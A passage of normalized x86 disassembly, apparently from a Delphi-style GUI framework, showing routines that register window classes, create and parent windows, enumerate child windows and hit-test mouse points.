mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_3ab39d4
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_3a6457c
mov [ esp ] ebx
mov [ esp + 0x4 ] edi
push 0x1
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax edi
call sub_3ab0e78
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_3ab0e78
mov edx ebx
mov eax edi
call sub_3ab3940
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_3ab0e78
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_3ab0e78
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax edi
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_3ab0e78
mov eax edi
call sub_3ab472c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_3ab362c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ab3ac8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov [ esp ] esi
mov [ esp + 0x4 ] ebx
push 0x0
mov edi esi
mov ecx edi
mov edx 0xb036
mov eax ebx
call sub_3ab0e78
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov dl 0x1
mov ebp esi
mov eax ebp
call sub_3ab3920
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb0 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_3ab398c
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax ebx
call sub_3ab0e78
push 0x0
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax ebx
call sub_3ab0e78
mov eax ebx
call sub_3ab36e8
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
movzx edx [ esi + 0x57 ]
mov eax esi
call sub_3ab000c
sub_3ab3b68
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x1cc ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x1d0 ]
call sub_3a7a494
mov edx edi
mov eax ebp
call sub_3a7a494
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3ab3bc4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_3ab3b68
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_3ab3c04
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_3aaeeac
cmp esi [ edi + 0x23c ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor eax eax
mov [ edi + 0x23c ] eax
sub_3ab3c34
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_3ab3bc4
add esp 0x10
retn
sub_3ab3c5c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_3ab3cc8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_3ab0294
test al al
je r-xdata
mov eax ebx
call sub_3ab02c4
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc7
call sub_3a6457c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_3a6457c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_3a6457c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_3ab3d30
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3ab3e4e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_3a63a44
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_3ab3cc8
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1d8 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x1c4 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_3ab7c38
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_3a64260
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_3a65504
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_3a6a1e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab3e55
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3ab3e5c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3ab401d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x1a8 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_3aac49c
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_3aac49c
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa0 ]
cmp [ esi + 0x1b4 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_3a6ea2c
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_3a6ea2c
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_3a6a3c0
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_3ab7fe4
push 0x1
mov eax [ esi + 0x68 ]
call sub_3a89260
mov ecx eax
mov edx 0x30
mov eax esi
call sub_3ab0e78
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_3ab7c38
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab4024
lea eax [ ebp - 0xc0 ]
call sub_3a652a0
retn
mov eax esi
mov si 0xffee
call sub_3a6457c
mov eax [ esi + 0x1b4 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_3ab402c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_3a67f50
mov [ esi + 0x1b4 ] eax
pop esi
pop ebx
retn
sub_3ab406c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a7f07c
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x242 ] eax
mov eax esi
call sub_3a7efcc
mov [ ebx + 0x246 ] eax
or [ ebx + 0x8c ] 0x20
mov eax esi
call sub_3a7f084
pop esi
pop ebx
retn
sub_3ab40a4
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x242 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x246 ] eax
mov eax esi
call sub_3a81420
mov edx [ ebx + 0x242 ]
mov eax esi
call sub_3a81354
mov edx [ ebx + 0x246 ]
mov eax esi
call sub_3a81354
mov eax esi
call sub_3a81428
add esp 0x10
pop esi
pop ebx
retn
sub_3ab410c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1cc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x242 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x242
call sub_3ab40f8
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
movzx eax [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1cc ]
mov edx esi
call sub_3a7a494
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_3a7a494
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_3ab41ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_3ab1520
mov eax [ ebp - 0x8 ]
push eax
push sub_3ab406c
mov eax [ ebp - 0x8 ]
push eax
push sub_3ab40a4
push ebp
call sub_3ab410c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3ab4248
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
call sub_3aae278
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3aafaf8
mov ebx eax
cmp ebx 0x1
jge r-xdata
lea eax [ ebx + 0x1 ]
call sub_3a6a374
mov edi eax
mov [ esi + 0x64 ] edi
mov eax edi
call sub_3a6a388
mov ecx eax
mov edx edi
mov eax esi
call sub_3aafb08
mov eax r-xdata
call sub_3a6a394
mov [ esi + 0x64 ] eax
jmp r-xdata
sub_3ab42a8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_3ab42f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab42fc
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_3a6ea2c
sub_3ab430c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x1d0 ]
mov edx ebx
call sub_3a7a4f0
mov esi eax
inc esi
mov eax [ edi + 0x1d0 ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x1d0 ]
mov edx esi
call sub_3a7a494
mov eax [ eax + 0x1b4 ]
test eax eax
jne r-xdata
sub_3ab4354
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa4 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_3ab430c
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_3ab3b68
call sub_3aaf08c
inc edi
dec esi
jne r-xdata
sub_3ab43ec
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
pop ebx
retn
sub_3ab4410
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
cmp [ esi + 0x232 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
push ecx
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
mov ecx edx
mov edx eax
mov eax [ esi + 0x234 ]
call [ esi + 0x230 ]
sub_3ab4460
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp ebx [ esi ]
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_3aac5e0
test eax eax
jne r-xdata
push 0xfffffff8
push ebx
call GetWindowLongA
cmp eax [ esi ]
jne r-xdata
push 0x0
movzx eax [ esi + 0x4 ]
push eax
push 0xb04a
push ebx
call __imp_SendMessageA
sub_3ab44a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x1b4 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1b4 ]
mov [ esp ] eax
test [ esi + 0x55 ] 0x20
setne dl
mov [ esp + 0x4 ] dl
mov edx esp
push edx
push sub_3ab4460
push eax
call EnumChildWindows
mov eax esi
mov edx [ eax ]
call [ edx + 0xb8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x1d0 ]
call sub_3a7a494
mov edx [ eax ]
call [ edx + 0xb0 ]
inc edi
dec ebx
jne r-xdata
sub_3ab4530
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_3a6457c
mov [ ebp - 0x5 ] al
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9120
xor eax eax
push ebp
push sub_3ab458c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
call sub_3ab472c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab4593
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab9120
retn
sub_3ab4593
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop esi
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call SetFocus
sub_3ab45bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x55 ] 0x8
je r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
jne r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1da ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x98 ]
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x1da ] dl
xor edx edx
push ebp
push sub_3ab4705
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x50 ]
or edx [ rw-data ]
mov [ eax + 0x50 ] edx
xor edx edx
push ebp
push sub_3ab46f4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x50 ]
mov ecx [ rw-data ]
not ecx
and edx ecx
mov [ eax + 0x50 ] edx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_3a7a494
call sub_3ab45bc
inc esi
dec ebx
jne r-xdata
sub_3ab472c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
jne r-xdata
mov ebx esi
cmp [ ebx + 0x1da ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
and eax [ rw-data ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab45bc
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ edi + 0x50 ]
or eax [ rw-data ]
mov [ edi + 0x50 ] eax
xor eax eax
push ebp
push sub_3ab47d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1da ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x50 ]
mov edx [ rw-data ]
not edx
and eax edx
mov edx [ ebp - 0x8 ]
mov [ edx + 0x50 ] eax
retn
sub_3ab4820
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x1c4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9120
xor eax eax
push ebp
push sub_3ab48f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c4 ] ebx
mov eax [ ebp - 0x4 ]
call sub_3ab472c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab9120
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c4 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c4 ] ebx
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b4 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab472c
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov ecx 0x30003
mov edx 0x127
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
sub_3ab4904
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3ab495c
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_3ab494b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab4952
call sub_3aae278
call sub_3a8d440
retn
sub_3ab497c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_3a78df4
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x8 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x1c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x1c ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0xc ]
mov [ ebp - 0x4 ] ax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x8 ]
mov [ ebp - 0x2 ] ax
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_3ab0e78
test eax eax
setne al
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_3ab4a48
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x1cc ]
test eax eax
je r-xdata
cmp [ esi + 0x1d0 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x1d0 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
test bl bl
je r-xdata
push ebp
mov edx edi
mov eax [ esi + 0x1cc ]
call sub_3a7a494
call sub_3ab497c
pop ecx
test al al
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x1
